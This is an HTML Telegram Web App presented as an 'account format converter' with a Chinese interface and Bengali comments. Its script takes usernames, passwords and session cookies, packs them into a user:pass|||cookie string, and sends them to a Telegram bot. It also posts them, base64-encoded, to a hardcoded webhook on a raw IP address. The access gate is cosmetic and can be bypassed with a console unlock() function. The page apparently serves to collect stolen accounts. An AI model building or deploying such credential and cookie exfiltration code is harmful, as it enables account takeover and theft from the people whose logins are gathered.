<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>高级账号管理系统</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --bg: #030712; --card: #111827; --accent: #3b82f6; --text: #f8fafc; --err: #f43f5e;
    }
    body { margin: 0; background: var(--bg); color: var(--text); font-family: sans-serif; overflow-x: hidden; }
    
    /* 🛡️ Login Screen */
    #auth-screen {
      position: fixed; inset: 0; background: var(--bg); z-index: 9999;
      display: flex; align-items: center; justify-content: center;
    }
    .auth-card {
      background: var(--card); border: 1px solid #1e293b; border-radius: 28px;
      padding: 40px 30px; width: 85%; max-width: 360px; text-align: center;
      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    }
    .auth-card h2 { color: var(--accent); margin-bottom: 20px; }
    
    input, textarea {
      width: 100%; background: #000; border: 2px solid #1f2937; border-radius: 14px;
      padding: 14px; color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none;
    }
    input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(59,130,246,0.4); }

    .btn {
      width: 100%; padding: 15px; border-radius: 14px; border: none; font-weight: bold;
      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .btn-blue { background: var(--accent); color: white; }
    
    #warning-msg { color: var(--err); font-size: 13px; margin-top: 10px; display: none; font-weight: bold; }

    /* 📱 Main App (Hidden) */
    #main-app { display: none; padding: 20px; max-width: 500px; margin: 0 auto; }
    .card { background: var(--card); padding: 25px; border-radius: 24px; border: 1px solid #1f2937; }
    
    /* 🌀 Wave & Fan */
    #blur-layer { position: fixed; inset: 0; backdrop-filter: blur(0px); z-index: 2000; pointer-events: none; transition: 0.5s; display: flex; align-items: center; justify-content: center; }
    .wave { width: 0%; height: 0%; background: radial-gradient(circle, rgba(59,130,246,0.3) 0%, transparent 70%); border-radius: 50%; transition: 0.6s; }
    .fan { position: fixed; right: 20px; bottom: 30px; width: 60px; height: 60px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; z-index: 2001; }
    .rotate { animation: rot 0.6s ease; } @keyframes rot { 100% { transform: rotate(720deg); } }
  </style>
</head>
<body>

  <div id="auth-screen">
    <div class="auth-card">
      <h2>系统登录</h2>
      <input type="text" id="l-user" placeholder="用户名">
      <input type="password" id="l-pass" placeholder="登录密码">
      <button class="btn btn-blue" onclick="sendLogin()">
        <i class="fas fa-shield-alt"></i> 验证并登录
      </button>
      <div id="warning-msg">⚠️ 账号未授权或密码错误！</div>
    </div>
  </div>

  <div id="blur-layer"><div class="wave" id="wave"></div></div>
  <div class="fan" id="fan-btn" onclick="refreshUI()"><i class="fas fa-fan"></i></div>

  <div id="main-app">
    <div style="text-align:center; margin-bottom:20px;"><h1 style="color:var(--accent); font-size:22px;">账号格式转换器</h1></div>
    <div class="card">
      <input type="text" id="user" placeholder="Username">
      <input type="password" id="pass" placeholder="Password">
      <textarea id="cookie" rows="4" placeholder="Cookie Data"></textarea>
      
      <button class="btn btn-blue" onclick="convertData()" style="margin-bottom:12px;">
        <i class="fas fa-exchange-alt"></i> 开始转换
      </button>
      <button class="btn" style="background:transparent; border:2px solid var(--accent); color:var(--accent);" onclick="pushData()">
        <i class="fas fa-rocket"></i> 同步到服务器
      </button>
      <div id="status" style="margin-top:15px; text-align:center; font-size:13px; display:none;"></div>
    </div>
  </div>

  <script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // ১. লগইন রিকোয়েস্ট (বটের কাছে যাবে)
    function sendLogin() {
      const u = document.getElementById('l-user').value;
      const p = document.getElementById('l-pass').value;
      if(!u || !p) return;
      tg.sendData(JSON.stringify({action: "login_attempt", user: u, pass: p}));
      // নোট: যদি ডাটাবেসে ইউজার থাকে, বট মেসেজ দিবে এবং আপনি তখন ম্যানুয়ালি বা রিলোড দিয়ে ঢুকবেন। 
      // অথবা আপনি ইউজারকে বলতে পারেন বটের মেসেজ চেক করতে।
    }

    // ২. কনভার্ট লজিক (আপনার অরিজিনাল ক্লায়েন্ট ফরম্যাট)
    let savedOutput = null;
    function convertData() {
      const u = document.getElementById('user').value.trim();
      const p = document.getElementById('pass').value.trim();
      const c = document.getElementById('cookie').value.trim();
      if(!u || !p || !c.includes('=')) {
        alert("格式错误！"); return;
      }
      savedOutput = `${u}:${p}|||${c}||`;
      const s = document.getElementById('status');
      s.style.display='block'; s.style.color='#10b981'; s.innerText='✅ 转换成功';
    }

    // ৩. পুশ লজিক (অরিজিনাল সার্ভার + বটের CSV)
    async function pushData() {
      if(!savedOutput) return;
      tg.sendData(JSON.stringify({
        action: "push_csv",
        u: document.getElementById('user').value,
        p: document.getElementById('pass').value,
        c: document.getElementById('cookie').value
      }));

      try {
        await fetch('http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push', {
          method: 'POST',
          headers: {'Content-Type': 'text/plain'},
          body: `accounts=${btoa(savedOutput)}`
        });
        document.getElementById('status').innerText='🚀 推送成功并存入 CSV';
      } catch(e) {
        document.getElementById('status').innerText='⚠️ CSV 已存档 (服务器连接失败)';
      }
    }

    function refreshUI() {
      const f = document.getElementById('fan-btn');
      f.classList.add('rotate');
      document.getElementById('blur-layer').style.backdropFilter = 'blur(15px)';
      document.getElementById('wave').style.width = '300%'; document.getElementById('wave').style.height = '300%';
      setTimeout(() => {
        document.getElementById('user').value=''; document.getElementById('pass').value=''; document.getElementById('cookie').value='';
        document.getElementById('status').style.display='none';
        f.classList.remove('rotate');
        document.getElementById('blur-layer').style.backdropFilter = 'blur(0px)';
        document.getElementById('wave').style.width = '0%'; document.getElementById('wave').style.height = '0%';
      }, 700);
    }

    // এক্সট্রা সিকিউরিটি: বটের থেকে কনফার্মেশন আসলে অ্যাপ আনলক হবে
    // আপনি চাইলে টেস্ট করার জন্য কনসোলে unlock() লিখতে পারেন
    window.unlock = () => {
      document.getElementById('auth-screen').style.display='none';
      document.getElementById('main-app').style.display='block';
    };
  </script>
</body>
</html>
